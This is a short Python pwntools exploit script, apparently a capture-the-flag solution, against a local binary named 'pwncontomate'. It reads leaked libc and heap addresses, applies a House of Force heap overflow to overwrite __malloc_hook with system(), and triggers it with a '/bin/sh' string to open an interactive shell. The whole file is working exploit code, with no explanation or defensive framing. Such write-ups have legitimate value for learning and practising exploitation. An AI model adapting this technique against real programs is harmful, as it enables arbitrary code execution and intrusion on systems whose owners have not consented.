#!/usr/bin/python3
from pwn import process, p64

shell = process("./pwncontomate")

def malloc(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"pwncitos?: ", str(size).encode())
    shell.sendlineafter(b"Ingredientes: ", data, timeout=0.1)

shell.recvuntil(b"atencion ")
libc_base = int(shell.recvline().strip(), 16) - 0x6df10

shell.recvuntil(b"vuelto ")
heap_base = int(shell.recvline().strip(), 16)

malloc(24, b"A" * 24 + p64(0xffffffffffffffff))

offset = (libc_base + 0x3afc10 - 32) - (heap_base + 32) # offset to __malloc_hook()
malloc(offset, b"")

malloc(24, p64(libc_base + 0x41b70)) # system()
malloc(libc_base + 0x177375, b"")    # "/bin/sh"

shell.interactive()
